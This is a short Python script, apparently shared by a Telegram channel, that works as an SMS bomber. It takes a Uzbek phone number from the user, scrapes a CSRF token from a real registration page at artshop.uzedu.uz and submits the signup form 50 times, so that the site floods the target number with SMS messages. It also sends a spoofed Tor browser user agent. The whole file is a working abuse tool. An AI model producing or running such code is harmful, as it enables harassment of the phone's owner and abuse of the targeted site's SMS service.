import requests
from bs4 import BeautifulSoup
import os

os.system('cls' if os.name == 'nt' else 'clear')
print("\033[1;34m" + "Telegram @Networking_Security | Powered by S4ever" + "\033[0m")


def get_phone_number():
    phone_prefix = "+998"
    phone_suffix = input("Raqamni kiriting (Masalan: 90123467):  ")
    return f"{phone_prefix}{phone_suffix}"


def get_sms_count():
    return 50


session = requests.Session()

# URL for the registration page and the POST request
register_url = "https://artshop.uzedu.uz/uz/register"
post_url = "https://artshop.uzedu.uz/uz/register-post"

headers = {
    "User-Agent": "Tor_browser/1.0 (Linux_ubuntu 22.04 TLS) Gecko/20100112 Tor_browser/11.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/x-www-form-urlencoded"
}
try:
    response = session.get(register_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': '_token'}).get('value')
    if not csrf_token:
        raise Exception("CSRF token not found")

    telefon_raqam = get_phone_number()
    sms_count = get_sms_count()

    data = {
        "_token": csrf_token,
        "type": "2",
        "full_name": "Networking_Security",
        "phone_number": telefon_raqam,
        "password": "usernametest12",
        "confirm_password": "usernametest12"
    }
    # Step 2: Send the POST request multiple times
    for _ in range(sms_count):
        response = session.post(post_url, data=data, headers=headers)

        if response.ok:
            print("\033[1;32m" + "SMS yuborildi!" + "\033[0m")
        else:
            print("\033[1;31m" + f"Xatolik: {response.status_code}. SMS yuborilmadi." + "\033[0m")
            print(response.text)  # Optional: Show the full response for debugging

except Exception as e:
    print("\033[1;31m" + "Xatolik:" + "\033[0m", "\033[1;31m" + str(e) + "\033[0m")
